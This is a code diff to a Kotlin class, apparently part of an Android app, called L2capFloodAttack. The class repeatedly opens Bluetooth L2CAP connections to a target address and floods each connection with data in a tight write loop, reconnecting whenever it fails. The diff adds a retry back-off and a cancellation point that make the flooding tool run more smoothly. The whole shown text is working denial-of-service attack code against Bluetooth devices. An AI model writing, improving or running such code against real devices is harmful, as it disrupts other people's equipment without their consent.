@@ -15,8 +15,10 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.yield
 import java.io.IOException
 import java.util.UUID
 import kotlin.coroutines.coroutineContext
@@ -95,6 +97,9 @@ class L2capFloodAttack(private val targetAddress: String) {
                     UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                 )
                 log(context, element, "[#$workerId] Failed to connect, retrying..")
+                // Back off briefly so a device that refuses connections doesn't spin the CPU
+                // (and flood the log) with instant retries; still cancellable.
+                delay(100)
             } finally {
                 closeQuietly(socket)
             }
@@ -107,6 +112,8 @@ class L2capFloodAttack(private val targetAddress: String) {
         try {
             while (coroutineContext.isActive && AttackActivity.isAttacking && socket.isConnected) {
                 socket.outputStream.write(sendBuffer)
+                // Cooperative suspension point so cancellation (Stop) takes effect promptly.
+                yield()
             }
         } catch (e: IOException) {
             // Connection dropped; the worker loop will attempt to reconnect.
